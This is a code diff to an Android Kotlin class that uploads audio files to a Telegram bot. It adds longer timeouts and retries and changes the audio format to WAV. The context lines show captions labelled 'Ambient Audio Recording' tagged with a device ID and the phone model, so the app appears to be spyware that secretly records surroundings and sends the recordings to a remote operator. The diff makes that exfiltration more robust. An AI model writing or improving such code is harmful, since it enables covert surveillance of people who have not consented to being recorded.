@@ -12,9 +12,16 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 
+import java.util.concurrent.TimeUnit
+
 class TelegramBotManager(private val context: Context) {
     private val TAG = "TelegramBotManager"
-    private val client = OkHttpClient()
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(60, TimeUnit.SECONDS)
+        .writeTimeout(180, TimeUnit.SECONDS)
+        .readTimeout(180, TimeUnit.SECONDS)
+        .retryOnConnectionFailure(true)
+        .build()
     private val prefs = context.getSharedPreferences("admin_sync_prefs", Context.MODE_PRIVATE)
 
     companion object {
@@ -97,7 +104,7 @@ class TelegramBotManager(private val context: Context) {
         }
     }
 
-    suspend fun sendAudio(audioBytes: ByteArray, filename: String = "audio.amr", caption: String = ""): Boolean = withContext(Dispatchers.IO) {
+    suspend fun sendAudio(audioBytes: ByteArray, filename: String = "audio.wav", caption: String = ""): Boolean = withContext(Dispatchers.IO) {
         try {
             val token = getBotToken()
             val chatId = getChatId()
@@ -107,6 +114,7 @@ class TelegramBotManager(private val context: Context) {
             val model = "${Build.MANUFACTURER} ${Build.MODEL}"
             val fullCaption = "🎤 *Ambient Audio Recording*\n🆔 Device: `$deviceId`\n📱 Model: `$model`\n${if (caption.isNotBlank()) "📝 $caption" else ""}".trim()
 
+            val mimeType = if (filename.endsWith(".wav")) "audio/wav" else "audio/octet-stream"
             val url = "https://api.telegram.org/bot$token/sendDocument"
             val body = okhttp3.MultipartBody.Builder()
                 .setType(okhttp3.MultipartBody.FORM)
@@ -115,8 +123,8 @@ class TelegramBotManager(private val context: Context) {
                 .addFormDataPart("parse_mode", "Markdown")
                 .addFormDataPart(
                     "document",
-                    filename.ifEmpty { "audio.amr" },
-                    okhttp3.RequestBody.create("application/octet-stream".toMediaType(), audioBytes)
+                    filename.ifEmpty { "audio.wav" },
+                    okhttp3.RequestBody.create(mimeType.toMediaType(), audioBytes)
                 )
                 .build()
 
